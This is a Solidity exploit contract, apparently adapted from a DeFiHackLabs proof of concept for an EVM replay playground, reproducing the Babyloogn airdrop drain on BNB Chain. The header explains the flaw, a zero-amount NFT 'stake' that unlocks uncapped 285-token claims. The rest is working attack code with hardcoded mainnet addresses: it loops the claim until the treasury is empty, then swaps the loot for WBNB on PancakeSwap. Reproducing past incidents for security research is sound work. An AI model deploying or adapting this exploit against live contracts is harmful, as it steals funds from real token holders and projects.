// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-Babyloogn).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (attacker = address(this); no standalone exploit contract is deployed).
// This contract is a faithful, self-contained copy of that inline attack
// (testExploit -> TOKENTOWBNB) so the playground can deploy it and record
// run(). Logic and constants are copied verbatim from
// test/Babyloogn_exp.sol.
//
// Root cause: the Babyloogn Airdrop's claim function (selector 0xfbe81135)
// requires an ERC-1155 "stake" via safeTransferFrom(caller, airdrop, id, 0)
// - a transfer of amount ZERO - and in exchange pays out 285 real Babyloogn
// tokens from its own treasury. There is no per-user cap and the "stake" is
// a no-op, so the caller can loop the claim until the treasury (397,020 BBL)
// is drained, then dump the tokens through PancakeSwap for WBNB.

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

interface IBabyloognAirdrop {}

interface IBabyloognNFT {
    function setApprovalForAll(address operator, bool approved) external;
}

interface IBabyloogn {
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract BabyloognDrain {
    IBabyloogn constant Babyloogn = IBabyloogn(0x7fe5fAF242015Cf769Ae7feA565B96351Dd957A2);
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IPancakeRouter constant Router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IBabyloognAirdrop constant Airdrop = IBabyloognAirdrop(0x971d08bbA900230298ADD23e61E04B04226b5073);
    IBabyloognNFT constant BabyloognNTF = IBabyloognNFT(0x5eb47C41FC9BEcf123C9E484C51de37830842AdD);

    function run() external {
        Babyloogn.approve(address(Router), type(uint256).max);
        BabyloognNTF.setApprovalForAll(address(Airdrop), true);

        while (Babyloogn.balanceOf(address(Airdrop)) >= 285 * 1e18) {
            (bool success,) = address(Airdrop).call(abi.encodeWithSelector(bytes4(0xfbe81135), 1, 0));
            success;
        }

        TOKENTOWBNB();
    }

    function TOKENTOWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(Babyloogn);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            Babyloogn.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    fallback() external payable {}
    receive() external payable {}
}
